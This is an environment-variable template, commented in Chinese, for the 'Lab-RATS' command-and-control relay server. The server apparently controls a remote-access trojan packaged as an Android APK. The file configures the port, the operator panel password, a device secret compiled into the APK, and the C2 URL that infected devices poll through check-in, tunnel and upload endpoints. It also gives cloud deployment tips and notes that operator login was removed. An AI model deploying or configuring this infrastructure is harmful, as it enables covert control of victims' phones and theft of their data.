# =====================================================================
# Lab-RATS v1.6 C2 Relay Server — Environment Template
# 对应服务: c2-server/server.js (Node/Express relay)
# 用法: 复制为 .env 或注入容器/云平台环境变量。
# [面板重构] 约束：
#   - C2_PASSWORD 已改为可选：登录密码移除，启动仅打印提示，不再 exit
#   - DEVICE_SECRET 未设置 → 设备端点(/checkin /tunnel-poll /tunnel-response
#     /upload)对一切请求返回 401（启动时打印警告）
# =====================================================================

# ---- C2 监听端口 (服务端消费) ----------------------------------------
# c2-server/server.js: const PORT = process.env.PORT || 10000
# Render/Railway 等平台会注入自己的 PORT，本地/VPS 部署请显式指定。
PORT=10000

# ---- 面板口令（可选；登录密码已移除） ------------------------------------
# 面板重构后 /login 一律 302 回 /，操作员路由开放，无口令校验。
# 本变量仅供日志提示与将来重新启用登录时使用。
C2_PASSWORD=CHANGE_ME_STRONG_PASSPHRASE

# ---- 设备凭据（服务端消费；必填） --------------------------------------
# /checkin /tunnel-poll /tunnel-response /upload 要求 X-Device-Secret 头
# 与本值一致（timingSafeEqual）。必须与 APK 构建时经 local.properties
# 注入 BuildConfig 的 secret 完全相同。
DEVICE_SECRET=CHANGE_ME_DEVICE_SECRET

# ---- 面板口令哈希（预留，当前版本不消费） --------------------------------
C2_PASSWORD_SHA256=

# ---- C2 地址（构建期写入 APK，服务端运行时不消费） ------------------------
# APK Builder "C2 Webhook URL" 的值，写进 BuildConfig.WEBHOOK_URL。
# 设备端 C2_Tunnel 会轮询: <C2_URL>/tunnel-poll?deviceId=...
C2_URL=https://YOUR-C2-HOST.example.com

# ---- 时区（当前版本不消费；已知问题） ------------------------------------
# server.js 的 formatTime() 硬编码 'America/Toronto'，TZ 无效。
TZ=UTC

# ---- 其他预留 ---------------------------------------------------------
# NODE_ENV: 建议 production（关闭错误栈回显）
NODE_ENV=production
# UPLOAD_MAX_BYTES: 已内置 50MB 上限（server.js 常量），无需环境变量
